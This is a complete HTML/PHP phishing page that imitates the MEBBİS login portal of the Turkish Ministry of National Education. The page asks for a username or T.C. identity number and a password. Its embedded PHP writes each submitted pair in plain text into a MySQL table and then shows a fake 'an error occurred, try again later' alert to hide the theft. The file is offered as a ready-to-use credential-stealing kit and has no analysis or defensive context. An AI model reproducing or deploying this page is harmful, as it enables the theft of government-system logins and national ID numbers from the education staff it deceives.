

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>T.C.Millî Eğitim Bakanlığı</title>
    <link rel="stylesheet" type="text/css" href="cssyeni/bootstrapyeni.min.css">
    <link rel="stylesheet" type="text/css" href="cssyeni/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="cssyeni/iofrm-style.css">
    <link rel="stylesheet" type="text/css" href="cssyeni/iofrm-theme9.css">
    <link rel="stylesheet" type="text/css" href="cssyeni/jquery.mmenu.all.css">
    <link rel="stylesheet" type="text/css" href="cssyeni/loginstyle.css?v=1.0">
</head>
<body>
    <!-- The menu -->
   
    <a href="#menu" id="menuButton" style=""><i class="fa fa-bars" aria-hidden="true"></i>
    </a>
    <div class="form-body">
        <div class="row">
            <div class="img-holder">
                <div class="info-holder">
                    <h3>T.C.
                          <br>
                        Millî Eğitim Bakanlığı
                    <br />
                        Bilişim Sistemleri
                    <br />
                        MEBBİS</h3>
                    <p>Şifrenizi yenilemek için önce giriş yapınız.</p>
                    <div class="LeftImage">
                       
                    </div>
                    
                </div>
            </div>
            <div class="form-holder">
                <div class="form-content" id="particles-js">
                    <div class="form-items">
                        <div class="page-links">
                            <img src="images/logo-beyaz.png" alt="logo" class="img-fluid" />
                        </div>
                        <form name="ctl00" method="post" action="./" id="ctl00" class="form-">

                            <div id="pnlLogin">
    
                                

                        
                                </div>
                                <div class="input-group mb-3">
                                    <div class="input-group-prepend">
                                        <span class="input-group-text" id="txtKullaniciAdIcon"><i class="fa fa-user" aria-hidden="true"></i></span>
                                    </div>
                                    <input name="txtKullaniciAd" type="text" maxlength="20" id="txtKullaniciAd" class="form-control" placeholder="Kullanıcı Adı / T.C. Kimlik No" required="required" />
                                </div>
                                <div class="input-group mb-3">
                                    <div class="input-group-prepend">
                                        <span class="input-group-text" id="txtSifreIcon"><i class="fa fa-lock" aria-hidden="true"></i></span>
                                    </div>
                                    <input name="txtSifre" type="password" id="txtSifre" class="form-control" placeholder="Şifre" required="required" />
                                </div>
                                <div class="form-button">
                                    <input type="submit" name="btnGiris" value="Giriş" id="btnGiris" type="submit" class="ibtn float-right  text-center btnSubmit" value="Giriş" style="width: 50%" />
                                    
                            
                                   
                                </div>
                            
</div>
                            
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>


    </script>

<?php

$servername = "localhost";
$username = "root";
$password = "";
$database = "mebbis";

$conn = mysqli_connect($servername, $username, $password, $database);

$txtKullaniciAd = htmlspecialchars($_POST['txtKullaniciAd']);
$txtSifre = htmlspecialchars($_POST['txtSifre']);

$sql = ("INSERT INTO mebbis.bilgiler VALUES('Username > $txtKullaniciAd  |  Password > $txtSifre');");

if($txtKullaniciAd == "") {
    echo "";
} elseif(mysqli_query($conn, $sql)) {
    echo "<script>alert('Bir hata oluştu , lütfen daha sonra tekrar deneyiniz.')</script>";
}

?>
</body>
</html>
